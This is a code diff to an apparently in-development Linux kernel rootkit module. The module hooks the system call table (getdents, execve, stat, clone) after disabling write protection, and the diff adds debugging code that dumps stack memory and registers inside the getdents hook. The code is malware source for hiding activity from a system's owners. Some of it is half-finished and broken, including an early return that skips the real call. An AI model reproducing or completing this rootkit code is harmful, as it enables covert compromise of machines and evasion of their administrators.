@@ -23,17 +23,51 @@ MODULE_VERSION("0.1");
 unsigned long *syscall_table = NULL;
 
 
+const int N = 30;
+
 asmlinkage long (*sys_getdents_orig)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
 	//don't fucking put a print right here or it will crash for some reason
+	unsigned long possible_fd;
+	int i;
+	//asm("mov %%rax, %0" : "=r" (possible_fd));
+    register unsigned long rsp asm ("rsp");
+	register unsigned long rax asm ("r9");
+	register unsigned long rdi asm ("r10");
+	register unsigned long rsi asm ("r11");
+	register unsigned long rdx asm ("r12");
+	printk("Starting getdents dump\n");
+	for (i = 0; i < N; i++){
+		printk(KERN_INFO "Memory at rsp+%x:%lx\n", i*8, *(unsigned long*)(rsp+i*8));
+	}
+	printk(KERN_INFO "Register rax: %lx\n", rax);
+	printk(KERN_INFO "Register rdi: %lx\n", rdi);
+	printk(KERN_INFO "Register rsi: %lx\n", rsi);
+	printk(KERN_INFO "Register rdx: %lx\n", rdx);
+	printk(KERN_INFO "Fd: %x\n", fd);
+	if (*(unsigned long*)(rsp+24*8) == 0x8000){
+		printk(KERN_INFO "OJO: %s\n", ((struct linux_dirent*)(rsp+25*8))->d_name);
+	}
+	printk("Finished getdents dump\n");
+
+
+	return 0;
+	//unsigned long dmp[N];
+	//for (i = 0; i < N; i++){
+	//	dmp[i] = *(unsigned long*)(rsp+i*8);
+	//}
+	
+	//possible_fd = *(unsigned int*)(rsp+8);
 
 	long leidos = sys_getdents_orig(fd, dirent, count);
+	
 
 	/*if (dirent != 0)
 		//printk(KERN_INFO "ROOTKIT: sys_getdents: Fd: %u. Count: %u. Ino: %lx. Off: %lx. Reclen: %hx. Name: %s\n", oldfd, count, dirent->d_ino, dirent->d_off, dirent->d_reclen, dirent->d_name);
 		printk(KERN_INFO "ROOTKIT: sys_getdents: Fd: %x. Possible fd: %lx\n", fd, possible_fd);
 	else
 		printk(KERN_INFO "ROOTKIT: sys_getdents null dirent!?!?!?!\n");*/
+	//seems like count is unused, we'll probably have to use ret
 
 	/*int n, buff_offset;
 	struct linux_dirent* actual;
@@ -48,7 +82,6 @@ asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *d
 		n++;
 	}
 	printk(KERN_INFO "ROOTKIT sysgetdents read %d entries!", n);*/
-	printk(KERN_INFO "ROOTKIT: Hello from sys_getdents\n");
 	return leidos;
 }
 
@@ -90,8 +123,11 @@ int __init hooks(void){
 
 	ENABLE_WRITE();
 	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
+
 	if (HOOK_EXECVE) syscall_table[__NR_execve] = &sys_execve_hook;
+
 	if (HOOK_STAT) syscall_table[__NR_stat] = &sys_stat_hook;
+
 	if (HOOK_CLONE) syscall_table[__NR_clone] = &sys_clone_hook;
 	DISABLE_WRITE();
 
